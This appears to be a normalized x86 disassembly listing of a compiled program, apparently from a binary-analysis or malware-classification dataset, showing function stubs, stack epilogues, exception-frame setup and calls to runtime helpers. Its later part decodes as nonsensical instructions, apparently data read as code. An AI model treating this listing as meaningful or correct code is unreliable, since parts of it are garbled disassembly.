pop ebx
mov esp ebp
pop ebp
retn
sub_46d3b5
jmp sub_4039d0
sub_46d3bc
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46d4b7
jmp [ ecx ]
sub_46d688
lea eax [ ebp - 0x8 ]
call sub_40d19c
retn
sub_46d691
jmp sub_4039d0
j_sub_46d688
jmp sub_46d688
sub_46d698
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d6bd
lea eax [ ebp - 0x1c ]
call sub_404050
lea eax [ ebp - 0x4 ]
call sub_404050
retn
sub_46d6b6
jmp sub_4039d0
sub_46d6bd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46d6f5
jmp sub_4039d0
sub_46d6fc
pop ebp
retn
sub_46d778
retn
sub_46d779
jmp sub_4039d0
j_sub_46d778
jmp sub_46d778
sub_46d780
pop ebp
retn
sub_46d784
sub [ rw-data ] 0x1
retn
sub_46dbe5
jmp sub_4039d0
sub_46dbec
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
j_sub_4039d0#9
jmp sub_4039d0
sub_46dd49
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46ddda
jmp sub_4039d0
sub_46dde1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46de1d
jmp sub_4039d0
sub_46de24
pop ebp
retn
sub_46de28
sub [ rw-data ] 0x1
jae r-xdata
retn
mov ecx rw-data
mov edx [ rw-data ]
mov eax [ r-xdata ]
call sub_46bb84
sub_46e0dd
jmp sub_4039d0
sub_46e0e4
pop ebp
retn
sub_46e0e8
sub [ rw-data ] 0x1
jae r-xdata
retn
mov ecx rw-data
mov edx [ rw-data ]
mov eax [ r-xdata ]
call sub_46bb84
sub_46e55f
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_404074
retn
sub_46e56d
jmp sub_4039d0
j_sub_46e55f
jmp sub_46e55f
sub_46e574
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46e6c6
jmp sub_4039d0
sub_46e6cd
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e6ef
lea eax [ ebp - 0x20 ]
mov edx 0x5
call sub_404074
retn
j_sub_4039d0#8
jmp sub_4039d0
sub_46e6ef
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46e89c
jmp sub_4039d0
sub_46e8a3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e8cd
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_404074
lea eax [ ebp - 0x4 ]
call sub_404050
retn
sub_46e8c6
jmp sub_4039d0
sub_46e8cd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_4039d0#7
jmp sub_4039d0
sub_46e974
pop ebp
retn
sub_46eaa5
0x46 0x0
sub_46ebb9
jmp sub_4039d0
sub_46ebc0
pop ebp
retn
sub_46ebc4
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_46eb14
mov ecx eax
mov edx r-xdata
mov eax [ r-xdata ]
call sub_46b734
sub_46ec1d
jmp sub_4039d0
sub_46ec24
pop ebp
retn
sub_46ec28
sub [ rw-data ] 0x1
retn
sub_46ec55
jmp sub_4039d0
sub_46ec5c
pop ebp
retn
sub_46ec60
sub [ rw-data ] 0x1
retn
sub_46f180
jmp sub_4039d0
sub_46f187
pop ebx
mov esp ebp
pop ebp
retn
sub_46f1d8
xor edx edx
mov eax [ eax + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
retn
j_sub_4039d0#6
jmp sub_4039d0
sub_46f279
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
j_sub_4039d0#5
jmp sub_4039d0
sub_46f310
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46f3b3
jmp sub_4039d0
sub_46f410
push ebx
push esi
mov esi edx
mov ebx eax
mov ecx esi
mov edx r-xdata
mov eax [ ebx + 0x28 ]
call sub_46a5c0
pop esi
pop ebx
retn
sub_46f44c
push ebx
push esi
mov esi edx
mov ebx eax
mov ecx esi
mov edx r-xdata
mov eax [ ebx + 0x28 ]
call sub_46a5c0
pop esi
pop ebx
retn
sub_46f47c
mov ecx edx
mov eax [ eax + 0x28 ]
mov edx r-xdata
call sub_46a794
retn
sub_46f4b0
mov ecx edx
mov eax [ eax + 0x28 ]
mov edx r-xdata
call sub_46a794
retn
sub_46f4db
mov eax [ esi + 0x24 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_46f592
jmp sub_4039d0
sub_46f599
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46f5d4
push ebx
push esi
mov esi edx
mov ebx eax
mov ecx esi
mov edx r-xdata
mov eax [ ebx + 0x28 ]
call sub_46a5c0
pop esi
pop ebx
retn
sub_46f608
mov ecx edx
mov eax [ eax + 0x28 ]
mov edx r-xdata
call sub_46a794
retn
j_sub_4039d0#4
jmp sub_4039d0
sub_46f6cf
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46f744
jmp sub_4039d0
sub_46f74b
pop ebp
retn
sub_46f7a5
jmp sub_4039d0
sub_46f7ac
pop ebp
retn
sub_46f7b0
sub [ rw-data ] 0x1
retn
sub_470719
jmp sub_4039d0
sub_470720
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47082a
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_404074
retn
j_sub_4039d0#3
jmp sub_4039d0
j_sub_47082a
jmp sub_47082a
sub_47083f
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_470932
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_404074
retn
sub_470940
jmp sub_4039d0
j_sub_470932
jmp sub_470932
sub_470947
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_470adb
lea eax [ ebp - 0x28 ]
mov edx 0x9
call sub_404074
retn
j_sub_4039d0#2
jmp sub_4039d0
j_sub_470adb
jmp sub_470adb
sub_470af0
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_470c23
lea eax [ ebp - 0x14 ]
mov edx 0x5
call sub_404074
retn
sub_470c31
jmp sub_4039d0
j_sub_470c23
jmp sub_470c23
sub_470c38
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_470df5
jmp sub_4039d0
sub_470dfc
pop ebp
retn
sub_470e00
sub [ rw-data ] 0x1
retn
sub_471538
pop ss
retn 0xfec2
sub_47166d
pop ss
inc eax
int3
sub_47172c
out 0x7b al
int1
jpe r-xdata
mov eax [ 0xffffffff98a49294 ]
ja r-xdata
0x827dfefe 0xdada
outsb
push ss
or ah dh
rcl [ edi ] 0x1
out 0xed al
sub_47173a
int1
jpe r-xdata
jl r-xdata
0x817dfefe 0xfef6
stosb [ edi ]
sub_4718c4
int1
dec ecx
hlt
sub_47358f
push ss
int3
sub_473677
retn 0xf417
sub_4736aa
xchg esi eax
xchg ebp eax
hlt
sub_473df8
retn 0x3ffd
sub_473f0f
outsb
outsb
outsb
xchg esi eax
retn 0xddf4
sub_473fa1
retn 0xcdad
sub_4743a5
0xc77bf1ff 0x131
sub_4743ac
add [ ebx - 0x47 ] esi
[ esi - 0x5106b70f ]
sub_4746ab
[ esi - 0x5106b70f ]
sub_4746cd
0xef7bf1ff 0x132
sub_4749f2
push ss
and [ 0x13960101 ] cl
int3
sub_4752f5
add dh [ edi ]
cmp eax 0x6e6e6e6e
add [ ebx + 0x1639751a ] ecx
int3
sub_4761a5
mov [ 0xffffffff8a7af102 ] eax
add al [ ecx ]
add [ ebp - 0x478c056c ] ebp
0x75ae
sub_476f15
jmp sub_4039d0
sub_476f1c
pop ebp
retn
j_sub_4039d0
jmp sub_4039d0
sub_477119
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47717a
retn
sub_47717b
jmp sub_4039d0
j_sub_47717a
jmp sub_47717a
sub_477182
pop ebp
retn
